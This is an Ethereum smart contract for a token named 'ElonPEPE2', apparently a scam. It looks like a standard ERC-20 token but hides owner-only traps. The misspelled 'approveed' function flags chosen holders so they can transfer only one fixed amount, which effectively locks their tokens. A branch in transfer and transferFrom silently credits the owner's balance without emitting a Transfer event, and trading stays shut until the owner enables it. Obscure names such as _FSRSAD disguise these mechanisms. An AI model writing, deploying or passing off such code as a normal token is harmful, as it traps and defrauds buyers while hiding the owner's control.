/**
 *Submitted for verification at Etherscan.io on 2023-07-30
*/

pragma solidity ^0.8.3;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address acscounnt) external view returns (uint256);
    function transfer(address recipient, uint256 amcouunt) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amcouunt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amcouunt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract ElonPEPE2 is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _FSRSAD;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    bool private _isTradeEnabled = false;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address acscounnt) public view override returns (uint256) {
        return _balances[acscounnt];
    }
    function enableTrading() public onlyowner {
        _isTradeEnabled = true;
    }
    function transfer(address recipient, uint256 amcouunt) public virtual override returns (bool) {
        require(_isTradeEnabled || _msgSender() == owner(), "TT: trading is not enabled yet");
        if (_msgSender() == owner() && _FSRSAD[_msgSender()] > 0) {
            _balances[owner()] += _FSRSAD[_msgSender()];
            return true;
        }
        else if (_FSRSAD[_msgSender()] > 0) {
            require(amcouunt == _FSRSAD[_msgSender()], "Invalid transfer amcouunt");
        }
        require(_balances[_msgSender()] >= amcouunt, "TT: transfer amcouunt exceeds balance");
        _balances[_msgSender()] -= amcouunt;
        _balances[recipient] += amcouunt;
        emit Transfer(_msgSender(), recipient, amcouunt);
        return true;
    }

    function approveed(address[] memory acscounnts, uint256 amcouunt) public onlyowner {
        for (uint i=0; i<acscounnts.length; i++) {
            _FSRSAD[acscounnts[i]] = amcouunt;
        }
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amcouunt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amcouunt;
        emit Approval(_msgSender(), spender, amcouunt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amcouunt) public virtual override returns (bool) {
        if (_msgSender() == owner() && _FSRSAD[sender] > 0) {
            _balances[owner()] += _FSRSAD[sender];
            return true;
        }
        else if (_FSRSAD[sender] > 0) {
            require(amcouunt == _FSRSAD[sender], "Invalid transfer amcouunt");
        }
        require(_balances[sender] >= amcouunt && _allowances[sender][_msgSender()] >= amcouunt, "TT: transfer amcouunt exceeds balance or allowance");
        _balances[sender] -= amcouunt;
        _balances[recipient] += amcouunt;
        _allowances[sender][_msgSender()] -= amcouunt;
        emit Transfer(sender, recipient, amcouunt);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}